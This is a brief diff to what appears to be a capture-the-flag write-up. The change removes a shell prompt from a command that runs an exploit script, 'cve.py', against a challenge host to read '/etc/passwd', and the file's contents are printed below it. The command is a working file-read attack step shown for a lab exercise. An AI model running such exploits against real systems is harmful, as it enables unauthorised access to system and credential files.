@@ -261,7 +261,7 @@ if __name__ == "__main__":
 Reading `/etc/passwd` 
 
 ```bash
-plaintext@archlinux ~/D/tools> python cve.py -u http://web.challenge.bugpwn.com:8080 -p "/etc/passwd"
+python cve.py -u http://web.challenge.bugpwn.com:8080 -p "/etc/passwd"
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 root:x:0:0:root:/root:/bin/bash
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
